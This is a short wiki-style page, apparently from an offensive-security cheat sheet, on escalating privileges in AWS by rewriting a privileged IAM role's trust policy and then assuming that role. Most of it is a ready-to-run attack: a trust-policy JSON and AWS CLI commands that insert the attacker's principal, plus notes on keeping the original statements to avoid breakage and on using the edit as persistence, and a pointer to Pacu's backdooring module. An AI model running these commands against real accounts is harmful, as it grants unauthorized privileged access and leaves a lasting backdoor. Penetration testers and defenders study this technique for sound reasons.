---
title: "Trust policy: rewrite a role's trust so you can assume it"
description: "iam:UpdateAssumeRolePolicy to rewrite a role's trust policy so your principal is allowed, then sts:AssumeRole into it."
keywords:
  - UpdateAssumeRolePolicy
  - trust policy
  - AssumeRole
  - role
  - STS
---

# Trust policy

A role's **trust policy** (`AssumeRolePolicyDocument`) decides who may assume it. `iam:UpdateAssumeRolePolicy` rewrites that document, so you edit a privileged role's trust to name your own principal, then assume it.

## Rewrite the trust and assume

```bash
cat > trust.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow",
 "Principal":{"AWS":"arn:aws:iam::<acct>:user/<you>"},
 "Action":"sts:AssumeRole"}]}
EOF
aws iam update-assume-role-policy --role-name <privileged-role> \
  --policy-document file://trust.json
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<privileged-role> \
  --role-session-name s
```

## Exploitation notes

- This overwrites the trust document, so preserve the original statements and append yours to avoid breaking the role's legitimate use.
- Needs only `iam:UpdateAssumeRolePolicy` on the role plus `sts:AssumeRole`; the role's own permissions are inherited on assumption.
- A durable trust edit also serves as persistence, since your principal keeps the ability to assume the role.

## Tools

- **AWS CLI** (`iam update-assume-role-policy`, `sts assume-role`).
- **Pacu** (`iam__privesc_scan`, `iam__backdoor_assume_role`): detects the path and backdoors role trust across roles at scale.

## References

- [Rhino Security Labs: AWS privilege escalation (UpdateAssumeRolePolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
